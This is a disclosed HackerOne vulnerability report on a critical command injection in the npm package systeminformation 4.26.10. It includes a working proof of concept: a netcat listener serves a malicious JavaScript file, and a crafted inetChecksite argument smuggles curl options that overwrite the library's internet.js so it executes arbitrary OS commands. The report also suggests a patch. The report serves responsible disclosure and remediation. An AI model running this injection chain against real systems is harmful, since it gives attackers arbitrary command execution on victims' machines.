# [systeminformation] Command Injection via insecure command formatting

## Report Details
- **Report ID**: 925324
- **URL**: https://hackerone.com/reports/925324
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2020-07-16T14:34:16.895Z
- **Disclosed**: 2020-11-16T16:42:51.827Z

## Reporter
- **Username**: effectrenan
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report a Command Injection vulnerability in the `systeminformation` package. It allows an attacker to inject arbitrary OS commands.

# Module
**Module name:** systeminformation
**Version:** 4.26.10
**npm page:** `https://www.npmjs.com/package/systeminformation`

## Module Description

System and OS information library for node.js.

## Module Stats

Weekly downloads: 363.195

# Vulnerability

## Vulnerability Description

The attacker can concatenate `curl` parameters to overwrite a Javascript file of the package and then execute any OS commands.

The `child_process.exec()` function executes the following command:
```bash
curl -I --connect-timeout 5 -m 5 $urlSanitized 2>/dev/null | head -n 1 | cut -d " " -f2 # $urlSanitized is the user input
```

## Steps To Reproduce:

Create a Javascript file with content:
```javascript
const { exec } = require('child_process')
function inetChecksite(url) {
  return exec(url)
}
exports.inetChecksite = inetChecksite
```

We can use Netcat to create a TCP server to send back our Javascript file created before on 443 port:
```bash
sudo nc -nlp 443 < file.js
```

Execute the code bellow to overwrite the Javascript file:
```javascript
const si = require('systeminformation')
const HOST = "127.0.0.1:443"

//The telnet was chosen to solve an issue with the protocol response check, like HTTP (HTTP/1.0 200 OK in the first line).
si.inetChecksite(`telnet://${HOST} --no-buffer -o node_modules/systeminformation/lib/internet.js`)

setTimeout(() => {
  process.exit()
}, 2000)
```

Now we can execute OS commands:
```javascript
const si = require('systeminformation')
si.inetChecksite("<Some OS command>")
```

## Patch

Replace:
```javascript
const exec = require('child_process').exec
```
To:
```javascript
const { spawn } = require('child_process')
```

## Supporting Material/References:

- ArchLinux 5.4.50 x64
- NODEJS 14.5.0
- NPM 6.14.5

# Wrap up

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N]

## Impact

An attacker can execute arbitrary OS  commands on the victim's machine.

## Attachments
No attachments
